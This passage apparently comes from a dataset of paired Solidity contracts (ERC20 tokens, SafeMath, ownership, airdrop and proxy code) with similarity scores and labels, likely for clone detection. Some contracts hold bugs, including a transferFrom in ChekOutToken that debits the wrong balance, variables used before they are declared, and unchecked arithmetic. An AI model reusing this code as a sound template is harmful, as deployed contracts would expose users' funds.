        uint256 public RATE = 1;
        bool public isMinting = false;
        bool public isExchangeListed = false;
        string public constant generatedBy  = ""Togen.io by Proof Suite"";

        using SafeMath for uint256;
        address public owner;

         
         modifier onlyOwner() {
            if (msg.sender != owner) {
                throw;
            }
             _;
         }

        
        mapping(address => uint256) balances;
        
        mapping(address => mapping(address=>uint256)) allowed;

        
        function () payable{
            createTokens();
        }

        
        constructor() public payable {
            address originalFeeReceive = 0x6661084EAF2DD24aCAaDe2443292Be76eb344888;

            ERC20 proofToken = ERC20(0xc5cea8292e514405967d958c2325106f2f48da77);
            if(proofToken.balanceOf(msg.sender) >= 1000000000000000000){
                msg.sender.transfer(500000000000000000);
            }
            else{
                if(isExchangeListed == false){
                    originalFeeReceive.transfer(500000000000000000);
                }
                else{
                    originalFeeReceive.transfer(3500000000000000000);
                }
            }
            owner = 0x6d4b0a7b174d9c9b5794ab18a19ae56d8bd59b7f; 
            balances[owner] = _totalSupply;
        }

        
        function burnTokens(uint256 _value) onlyOwner {

             require(balances[msg.sender] >= _value && _value > 0 );
             _totalSupply = _totalSupply.sub(_value);
             balances[msg.sender] = balances[msg.sender].sub(_value);

        }



        
         function createTokens() payable {
            if(isMinting == true){
                require(msg.value > 0);
                uint256  tokens = msg.value.div(100000000000000).mul(RATE);
                balances[msg.sender] = balances[msg.sender].add(tokens);
                _totalSupply = _totalSupply.add(tokens);
                owner.transfer(msg.value);
            }
            else{
                throw;
            }
        }


        function endCrowdsale() onlyOwner {
            isMinting = false;
        }

        function changeCrowdsaleRate(uint256 _value) onlyOwner {
            RATE = _value;
        }



        function totalSupply() constant returns(uint256){
            return _totalSupply;
        }
        
        function balanceOf(address _owner) constant returns(uint256){
            return balances[_owner];
        }

         
        function transfer(address _to, uint256 _value)  returns(bool) {
            require(balances[msg.sender] >= _value && _value > 0 );
            balances[msg.sender] = balances[msg.sender].sub(_value);
            balances[_to] = balances[_to].add(_value);
            Transfer(msg.sender, _to, _value);
            return true;
        }

    
    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value)  returns(bool) {
        require(allowed[_from][msg.sender] >= _value && balances[_from] >= _value && _value > 0);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        Transfer(_from, _to, _value);
        return true;
    }

    
    
    function approve(address _spender, uint256 _value) returns(bool){
        allowed[msg.sender][_spender] = _value; 
        Approval(msg.sender, _spender, _value);
        return true;
    }

    
    function allowance(address _owner, address _spender) constant returns(uint256){
        return allowed[_owner][_spender];
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);",0.9745256,"contract ACCOUNTinJPY {
        
        string public constant name = ""ACCOUNTinJPY"";
        string public constant symbol = ""JPY"";
        uint8 public constant decimals = 8;
        uint public _totalSupply = 1;
        uint256 public RATE = 1;
        bool public isMinting = true;
        bool public isExchangeListed = false;
        string public constant generatedBy  = ""Togen.io by Proof Suite"";
        
        using SafeMath for uint256;
        address public owner;
        
         
         modifier onlyOwner() {
            if (msg.sender != owner) {
                throw;
            }
             _;
         }
     
        
        mapping(address => uint256) balances;
        
        mapping(address => mapping(address=>uint256)) allowed;

        
        function () payable{
            createTokens();
        }

        
        constructor() public payable {
            address originalFeeReceive = 0x6661084EAF2DD24aCAaDe2443292Be76eb344888;

            ERC20 proofToken = ERC20(0xc5cea8292e514405967d958c2325106f2f48da77);
            if(proofToken.balanceOf(msg.sender) >= 1000000000000000000){
                msg.sender.transfer(500000000000000000);
            }
            else{
                if(isExchangeListed == false){
                    originalFeeReceive.transfer(500000000000000000);
                }
                else{
                    originalFeeReceive.transfer(3500000000000000000);
                }
            }
            owner = 0x8812a36a18b3d2a64dd6614816f0a09600b3e81b; 
            balances[owner] = _totalSupply;
        }

        
        function burnTokens(uint256 _value) onlyOwner {

             require(balances[msg.sender] >= _value && _value > 0 );
             _totalSupply = _totalSupply.sub(_value);
             balances[msg.sender] = balances[msg.sender].sub(_value);
             
        }



        
         function createTokens() payable {
            if(isMinting == true){
                require(msg.value > 0);
                uint256  tokens = msg.value.div(100000000000000).mul(RATE);
                balances[msg.sender] = balances[msg.sender].add(tokens);
                _totalSupply = _totalSupply.add(tokens);
                owner.transfer(msg.value);
            }
            else{
                throw;
            }
        }


        function endCrowdsale() onlyOwner {
            isMinting = false;
        }

        function changeCrowdsaleRate(uint256 _value) onlyOwner {
            RATE = _value;
        }


        
        function totalSupply() constant returns(uint256){
            return _totalSupply;
        }
        
        function balanceOf(address _owner) constant returns(uint256){
            return balances[_owner];
        }

         
        function transfer(address _to, uint256 _value)  returns(bool) {
            require(balances[msg.sender] >= _value && _value > 0 );
            balances[msg.sender] = balances[msg.sender].sub(_value);
            balances[_to] = balances[_to].add(_value);
            Transfer(msg.sender, _to, _value);
            return true;
        }
        
    
    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value)  returns(bool) {
        require(allowed[_from][msg.sender] >= _value && balances[_from] >= _value && _value > 0);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        Transfer(_from, _to, _value);
        return true;
    }
    
    
    
    function approve(address _spender, uint256 _value) returns(bool){
        allowed[msg.sender][_spender] = _value; 
        Approval(msg.sender, _spender, _value);
        return true;
    }
    
    
    function allowance(address _owner, address _spender) constant returns(uint256){
        return allowed[_owner][_spender];
    }
    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract JoseToken is IERC20 {

    using SafeMath for uint256;

    uint public  _totalSupply = 0;

    string public constant symbol = ""VIC"";
    string public constant name = ""JoseToken"";
    uint8 public constant decimals = 18;

    
    uint256 public constant RATE = 500;

    address public owner;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    function () payable {
        createTokens();
    }

    function JoseToken() {
        owner = msg.sender;
    }

    function createTokens() payable {
        require(msg.value > 0);

        uint256 tokens = msg.value.mul(RATE);
        balances[msg.sender] = balances[msg.sender].add(tokens);
        _totalSupply = _totalSupply.add(tokens);

        owner.transfer(msg.value);
    }

    function totalSupply () constant returns (uint256 totalSupply) {
        return _totalSupply;
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances [_owner];
    }

    function transfer(address _to, uint256 _value) returns (bool success) {
        require(
            balances[msg.sender] >= _value
            && _value > 0
        );
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        require(
            allowed[_from][msg.sender] >= _value
            && balances[_from] >= _value
            && _value > 0
        );
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.967262112,"contract StripperToken is ERC20 {
    
    using SafeMath for uint256;
    
    uint public constant _totalSupply = 1000000000000000000000000;
    
    string public constant symbol = ""STRP"";
    string public constant name = ""Stripper Token"";
    uint8 public constant decimals = 18;
    
    
    uint256 public constant RATE = 100;
    
    address public owner;
    
    
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    
    function ( ) payable {
        createTokens( );
    }
    
    
    function StripperToken( ) {
        owner = msg.sender;
    }
    
    function createTokens( ) payable {
        require(msg.value > 0);
        
        uint256 tokens = msg.value.mul(RATE);
        balances[msg.sender] = balances[msg.sender].add(tokens);
        
        owner.transfer(msg.value);
    }
    
    function totalSupply( ) constant returns (uint256 totalSupply) {
       return _totalSupply;
    }
   
   function balanceOf(address _owner) constant returns (uint256 balance) {
       return balances[_owner];
   }
   
   function transfer(address _to, uint256 _value) returns (bool success) {
       require(
           balances[msg.sender] >= _value
           && _value > 0
        );
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(msg.sender, _to, _value);
        return true;
   }
   
   function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
       require(
           allowed[_from][msg.sender] >= _value
           && balances[_from] >= _value
           && _value > 0 
        );
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        Transfer(_from, _to, _value);
        return true;
    }
    
    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
        
    }
event Transfer(address indexed _from, address indexed _to, uint256 _value);
event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract SafeMath {
    function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {
        uint256 z = x + y;
        assert((z >= x) && (z >= y));
        return z;
    }

    function safeSub(uint256 x, uint256 y) internal pure returns(uint256) {
        assert(x >= y);
        uint256 z = x - y;
        return z;
    }

    function safeMult(uint256 x, uint256 y) internal pure returns(uint256) {
        uint256 z = x * y;
        assert((x == 0) || (z / x == y));
        return z;
    }
}",0.975820864,"contract SafeMath {

    function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {

        uint256 z = x + y;

        assert((z >= x) && (z >= y));

        return z;

    }



    function safeSubtract(uint256 x, uint256 y) internal pure returns(uint256) {

        assert(x >= y);

        uint256 z = x - y;

        return z;

    }



    function safeMult(uint256 x, uint256 y) internal pure returns(uint256) {

        uint256 z = x * y;

        assert((x == 0)||(z/x == y));

        return z;

    }



}",1,,,,,
"contract Token {
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.912875654,"contract Token {

    
    function totalSupply() constant returns (uint supply) {}

    
    
    function balanceOf(address _owner) constant returns (uint balance) {}

    
    
    
    
    function transfer(address _to, uint _value) returns (bool success) {}

    
    
    
    
    
    function transferFrom(address _from, address _to, uint _value) returns (bool success) {}

    
    
    
    
    function approve(address _spender, uint _value) returns (bool success) {}

    
    
    
    function allowance(address _owner, address _spender) constant returns (uint remaining) {}

    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}",1,,,,,
"contract StandardToken is Token {
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;

    function transfer(address _to, uint256 _value) public returns (bool success) {
        if(balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else {
            return false;
        }
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
      if(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else {
            return false;
        }
    }

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}",0.974633465,"contract StandardToken is Token {



    function transfer(address _to, uint256 _value) returns (bool success) {

        

        if (balances[msg.sender] >= _value && _value > 0) {

            balances[msg.sender] -= _value;

            balances[_to] += _value;

            Transfer(msg.sender, _to, _value);

            return true;

        } else { return false; }

    }



    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

        

        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {

            balances[_to] += _value;

            balances[_from] -= _value;

            allowed[_from][msg.sender] -= _value;

            Transfer(_from, _to, _value);

            return true;

        } else { return false; }

    }



    function balanceOf(address _owner) constant returns (uint256 balance) {

        return balances[_owner];

    }



    function approve(address _spender, uint256 _value) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;

    }



    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {

      return allowed[_owner][_spender];

    }



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;

    uint256 public totalSupply;

}",1,,,,,
"contract RegularToken is Token {

    function transfer(address _to, uint _value) returns (bool) {

        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }

    function transferFrom(address _from, address _to, uint _value) returns (bool) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }

    function balanceOf(address _owner) constant returns (uint) {
        return balances[_owner];
    }

    function approve(address _spender, uint _value) returns (bool) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint) {
        return allowed[_owner][_spender];
    }

    mapping (address => uint) balances;
    mapping (address => mapping (address => uint)) allowed;
    uint public totalSupply;
}",0.938627912,"contract StandardToken is Token {

 

    function transfer(address _to, uint256 _value) returns (bool success) {

        if (balances[msg.sender] >= _value && _value > 0) {

            balances[msg.sender] -= _value;

            balances[_to] += _value;

            Transfer(msg.sender, _to, _value);

            return true;

        } else {

            return false;

        }

    }

 

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {

            balances[_to] += _value;

            balances[_from] -= _value;

            allowed[_from][msg.sender] -= _value;

            Transfer(_from, _to, _value);

            return true;

        } else {

            return false;

        }

    }

 

    function balanceOf(address _owner) constant returns (uint256 balance) {

        return balances[_owner];

    }

 

    function approve(address _spender, uint256 _value) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;

    }

 

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {

        return allowed[_owner][_spender];

    }

 

    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;

}",1,,,,,
"contract ParentToken is UnboundedRegularToken {

    uint public totalSupply = 20*10**26;
    uint8 constant public decimals = 18;
    string constant public name = ""ParentToken"";
    string constant public symbol = ""PAT"";

    function ParentToken() {
        balances[msg.sender] = totalSupply;
        Transfer(address(0), msg.sender, totalSupply);
    }
}",0.924082075,"contract LPTToken is UnboundedRegularToken {

    uint public totalSupply = 10*10**26;
    uint8 constant public decimals = 18;
    string constant public name = ""LPTToken"";
    string constant public symbol = ""LPT"";

    function LPTToken() {
        balances[msg.sender] = totalSupply;
        Transfer(address(0), msg.sender, totalSupply);
    }
}",1,,,,,
"contract Distribution is Ownable {

         Token token;

         event TransferredToken(address indexed to, uint256 value);
         event FailedTransfer(address indexed to, uint256 value);

         modifier whenDistributionIsActive() {
            assert(isActive());

           _;
          }

        function Distribution () {
        address _tokenAddr = 0xa7a13cf0ae06a743fd464a9565af38c146a7d14d ; 
         token = Token(_tokenAddr);
        }

       function isActive() constant returns (bool) {
         return (
             tokensAvailable() > 0
           );
         }

        function sendTokens(address[] dests, uint256[] values) whenDistributionIsActive onlyOwner external {
           uint256 i = 0;
           while (i < dests.length) {
              uint256 toSend = values[i] * 10**15;
              sendInternally(dests[i] , toSend, values[i]);
              i++;
             }
            }
        function sendTokensSingleValue(address[] dests, uint256 value) whenDistributionIsActive onlyOwner external {
          uint256 i = 0;
          uint256 toSend = value * 10**15;
          while (i < dests.length) {
             sendInternally(dests[i] , toSend, value);
             i++;
            }
           }

        function sendInternally(address recipient, uint256 tokensToSend, uint256 valueToPresent) internal {
           if(recipient == address(0)) return;

           if(tokensAvailable() >= tokensToSend) {
             token.transfer(recipient, tokensToSend);
             TransferredToken(recipient, valueToPresent);
           } else {
             FailedTransfer(recipient, valueToPresent);
            }
          }

             function tokensAvailable() constant returns (uint256) {
               return token.balanceOf(this);
              }

             function destroy() onlyOwner {
               uint256 balance = tokensAvailable();
               require (balance > 0);
               token.transfer(owner, balance);
               selfdestruct(owner);
               }
              }",0.911965274,"contract LudumAirdrop is Ownable {

	Token token;

	event TransferredToken(address indexed to, uint256 value);
	event FailedTransfer(address indexed to, uint256 value);

	modifier whenDropIsActive() {
		assert(isActive());
		_;
	}

	function LudumAirdrop () public {
	    address _tokenAddr = 0x28a40acF39b1D3C932f42dD8068ad00A5Ad6448F;
	    token = Token(_tokenAddr);
	}

	function isActive() public constant returns (bool) {
		return (
			tokensAvailable() > 0 
		);
	}

	
	function sendLudumToMany(address[] dests, uint256[] values) whenDropIsActive onlyOwner external {
		uint256 i = 0;
		while (i < dests.length) {
			
			uint256 toSend = values[i];
			sendInternally(dests[i] , toSend, values[i]);
			i++;
		}
	}

	
	function sendLudumToSingle(address[] dests, uint256 value) whenDropIsActive onlyOwner external {
		uint256 i = 0;
		
		uint256 toSend = value;
		while (i < dests.length) {
			sendInternally(dests[i] , toSend, value);
			i++;
		}
	}  

	function sendInternally(address recipient, uint256 tokensToSend, uint256 valueToPresent) internal {
		if(recipient == address(0)) return;

		if(tokensAvailable() >= tokensToSend) {
			token.transfer(recipient, tokensToSend);
			TransferredToken(recipient, valueToPresent);
		} else {
			FailedTransfer(recipient, valueToPresent); 
		}
	}   


	function tokensAvailable() public constant returns (uint256) {
		return token.balanceOf(this);
	}

	function sendRemainsToOwner() public onlyOwner {
		uint256 balance = tokensAvailable();
		require (balance > 0);
		token.transfer(owner, balance);
		
	}

}",3,,,,,
"contract owned {

    address public owner;

    function owned() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        if (msg.sender != owner) throw;
        _;
    }

}",0.918971245,"contract Owned {
    address public owner;
    
    modifier onlyOwner {
        if (msg.sender != owner) revert();
        _;
    }
    
    function Owned() {
        owner = msg.sender;
    }
}",1,,,,,
"contract ERC20Basic {
  uint public totalSupply = 200000;
  function balanceOf(address who) constant returns (uint);
  function transfer(address to, uint value);
  event Transfer(address indexed from, address indexed to, uint value);
}",0.921234064,"contract ERC20Basic {
     uint public totalSupply;
     function balanceOf(address who) public view returns (uint); 
     function transfer(address to, uint value) public ; 
     event Transfer(address indexed from, address indexed to, uint value); 
}",1,,,,,
"contract Airdropper is Ownable {

    function multisend(address _tokenAddr, address[] dests, uint256 value)
    onlyOwner
    returns (uint256) {
        uint256 i = 0;
        while (i < dests.length) {
           ERC20(_tokenAddr).transfer(dests[i], value);
           i += 1;
        }
        return(i);
    }
}",0.949867625,"contract Multidrop is Ownable {



    function multisend(address _tokenAddr, address[] dests, uint256[] values)

    onlyOwner

    returns (uint256) {

        uint256 i = 0;

        while (i < dests.length) {

           ERC20(_tokenAddr).transfer(dests[i], values[i]);

           i += 1;

        }

        return(i);

    }

}",1,,,,,
"contract Token {
    function totalSupply() public view returns (uint256 supply) {}
    function balanceOf(address _owner) public view returns (uint256 balance) {}
    function transfer(address _to, uint256 _value) public returns (bool success) {}
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}
    function approve(address _spender, uint256 _value) public returns (bool success) {}
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {}
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.983797857,"contract Erc20

{   

    

    function totalSupply() public view returns (uint256 amount);

    function balanceOf(address owner) public view returns (uint256 balance);

    function transfer(address to, uint256 value) public returns (bool success);

    function transferFrom(address from, address to, uint256 value) public returns (bool success);

    function approve(address spender, uint256 value) public returns (bool success);

    function allowance(address owner, address spender) public view returns (uint256 remaining);

    

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}",1,,,,,
"contract UpgradeabilityProxy is Proxy {
  
  event Upgraded(address indexed implementation);

  
  bytes32 private constant implementationPosition = keccak256(""org.zeppelinos.proxy.implementation"");

  
  function UpgradeabilityProxy() public {}

  
  function implementation() public view returns (address impl) {
    bytes32 position = implementationPosition;
    assembly {
      impl := sload(position)
    }
  }

  
  function setImplementation(address newImplementation) internal {
    bytes32 position = implementationPosition;
    assembly {
      sstore(position, newImplementation)
    }
  }

  
  function _upgradeTo(address newImplementation) internal {
    address currentImplementation = implementation();
    require(currentImplementation != newImplementation);
    setImplementation(newImplementation);
    emit Upgraded(newImplementation);
  }
}",0.968685074,"contract UpgradeabilityProxy is Proxy {
  
  event Upgraded(address indexed implementation);

  
  bytes32 private constant implementationPosition = keccak256(""org.zeppelinos.proxy.implementation"");

  
  constructor() public {}

  
  function implementation() public view override returns (address impl) {
    bytes32 position = implementationPosition;
    assembly {
      impl := sload(position)
    }
  }

  
  function setImplementation(address newImplementation) internal {
    bytes32 position = implementationPosition;
    assembly {
      sstore(position, newImplementation)
    }
  }

  
  function _upgradeTo(address newImplementation) internal {
    address currentImplementation = implementation();
    require(currentImplementation != newImplementation);
    setImplementation(newImplementation);
    emit Upgraded(newImplementation);
  }
}",1,,,,,
"contract SimpleToken is StandardToken {
    string public name = ""KennCoin"";
    string public symbol = ""KEN"";
    uint public decimals = 3;
    uint public INITIAL_SUPPLY = 10000;

    function SimpleToken() public {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
    }
}",0.908529708,"contract SimpleToken is StandardToken{
    
    string public name = ""CryptoSoft Coin"";
    string public symbol =""CSC"";
    uint public decimals = 2;
	
    uint public INITIAL_SUPPLY = 987654321000;
    
    function SimpleToken(){
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        
    }
    
}",1,,,,,
"contract ChekOutToken is IERC20 {

using SafeMath for uint256;

uint public _totalSupply = 0;

string public constant symbol = ""CHEKS"";
string public constant name = ""ChekOut Token"";
uint8 public constant decimals = 18;


uint256 public constant RATE = 20000000;


uint256 public constant maxTokens = 40000000000000000000000000;

address public owner;

mapping (address => uint256) public balances;
mapping(address => mapping(address => uint256)) allowed;

function () payable{
    createTokens();
}

function ChekOutToken(){
    owner = msg.sender;
}

function createTokens() payable{
    require(msg.value > 0);
    require(_totalSupply.add(tokens) <= maxTokens);
    uint256 tokens = msg.value.mul(RATE);
    balances[msg.sender] = balances[msg.sender].add(tokens);
    _totalSupply = _totalSupply.add(tokens);
    owner.transfer(msg.value);
    require(_totalSupply.add(tokens) <= maxTokens);
}

function totalSupply() public constant returns (uint256 totalSupply) {
    return _totalSupply;
}

function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
}

function transfer(address _to, uint256 _value) public returns (bool success) {
    require(balances[msg.sender] >= _value && _value > 0);
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
}

function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(allowed[_from][msg.sender] >= _value && balances[_from] >= _value && _value > 0);
    balances[_from] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    Transfer(_from, _to, _value);
    return true;
}

function approve(address _spender, uint256 _value) public returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
}

function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
}

event Transfer(address indexed _from, address indexed _to, uint256 _value);

event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}",0.910546673,"contract ETHYOLO is IERC20 {
    
    using SafeMath for uint256;
    
    uint public _totalSupply = 99994138888;
    uint public INITIAL_SUPPLY = 4999706944;
    string public constant symbol = ""EYO"";
    string public constant name = ""ETHYOLO COIN"";
    uint8 public constant decimals = 18;
    
    address public constant multisig = ""0x82Ee855ecA88c30029582917a536d1A7ce3886d2"";
    
    
    uint256 public constant RATE = 75000000;
    
    address public owner;
    
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    
    function ETHYOLO() {
        owner = msg.sender;
    }
    
    function () payable {
        createTokens();
    }
    
    function createTokens() payable {
        require(msg.value > 0);
        
        uint256 tokens= msg.value.mul(RATE);
        balances[msg.sender] = balances[msg.sender].add(tokens);
        _totalSupply = _totalSupply.add(tokens);
        
        
        owner.transfer(msg.value);
        
    }
    
    function totalSupply() constant returns (uint256 _totalSupply) {
        return _totalSupply;
    }
    
    function INITIAL_SUPPLY() {
        INITIAL_SUPPLY = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
    }
    
    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }
    
    function transfer(address _to, uint256 _value) returns (bool success) {
        require(
            balances[msg.sender] >= _value
            && _value > 0
        );
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(msg.sender, _to, _value);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        require(
            allowed[_from][msg.sender] >= _value
            && balances[_from] >= _value
            && _value > 0
        );
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed [_from][msg.sender].sub(_value);
        Transfer(_from, _to, _value);
        return true;
    }
    
    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract DSAuth is DSAuthEvents {
    DSAuthority  public  authority;
    address      public  owner;

    constructor() public {
        owner = msg.sender;
        emit LogSetOwner(msg.sender);
    }

    function setOwner(address owner_)
        public
        auth
    {
        owner = owner_;
        emit LogSetOwner(owner);
    }

    function setAuthority(DSAuthority authority_)
        public
        auth
    {
        authority = authority_;
        emit LogSetAuthority(authority);
    }

    modifier auth {
        require(isAuthorized(msg.sender, msg.sig));
        _;
    }

    function isAuthorized(address src, bytes4 sig) internal view returns (bool) {
        if (src == address(this)) {
            return true;
        } else if (src == owner) {
            return true;
        } else if (authority == DSAuthority(0)) {
            return false;
        } else {
            return authority.canCall(src, this, sig);
        }
    }
}",0.918757026,"contract DSAuth is DSAuthEvents {
    DSAuthority  public  authority;
    address      public  owner;

    function DSAuth() {
        owner = msg.sender;
        LogSetOwner(msg.sender);
    }

    function setOwner(address owner_)
    auth
    {
        owner = owner_;
        LogSetOwner(owner);
    }

    function setAuthority(DSAuthority authority_)
    auth
    {
        authority = authority_;
        LogSetAuthority(authority);
    }

    modifier auth {
        assert(isAuthorized(msg.sender, msg.sig));
        _;
    }

    function isAuthorized(address src, bytes4 sig) internal returns (bool) {
        if (src == address(this)) {
            return true;
        } else if (src == owner) {
            return true;
        } else if (authority == DSAuthority(0)) {
            return false;
        } else {
            return authority.canCall(src, this, sig);
        }
    }

    function assert(bool x) internal {
        if (!x) throw;
    }
}",2,,,,,
"contract DSNote {
    event LogNote(
        bytes4   indexed  sig,
        address  indexed  guy,
        bytes32  indexed  foo,
        bytes32  indexed  bar,
        uint              wad,
        bytes             fax
    ) anonymous;

    modifier note {
        bytes32 foo;
        bytes32 bar;

        assembly {
            foo := calldataload(4)
            bar := calldataload(36)
        }

        emit LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);

        _;
    }
}",0.979565604,"contract DSNote {

    event LogNote(

        bytes4   indexed  sig,

        address  indexed  guy,

        bytes32  indexed  foo,

        bytes32  indexed  bar,

	uint	 	  wad,

        bytes             fax

    ) anonymous;



    modifier note {

        bytes32 foo;

        bytes32 bar;



        assembly {

            foo := calldataload(4)

            bar := calldataload(36)

        }



        LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);



        _;

    }

}",1,,,,,
"contract Owned {
address owner;

function Owned() public {
    owner = msg.sender;
}
modifier onlyOwner {
   require(msg.sender == owner);
   _;
 }
}",0.922224986,"contract Owned {

    
    address internal owner;


    
    function Owned() {
        owner = msg.sender;
    }


    
    modifier only_owner() {
        require(msg.sender == owner);

        _;
    }
}",1,,,,,
"contract SafeMath {
function safeMul(uint a, uint b) internal returns (uint) {
    uint c = a * b;
    assert(a == 0 || c / a == b);
    return c;
}

function safeDiv(uint a, uint b) internal returns (uint) {
    assert(b > 0);
    uint c = a / b;
    assert(a == b * c + a % b);
    return c;
}

function safeSub(uint a, uint b) internal returns (uint) {
    assert(b <= a);
    return a - b;
}

function safeAdd(uint a, uint b) internal returns (uint) {
    uint c = a + b;
    assert(c >= a);
    return c;
}

function max64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a >= b ? a : b;
}

function min64(uint64 a, uint64 b) internal constant returns (uint64) 
{
    return a < b ? a : b;
}

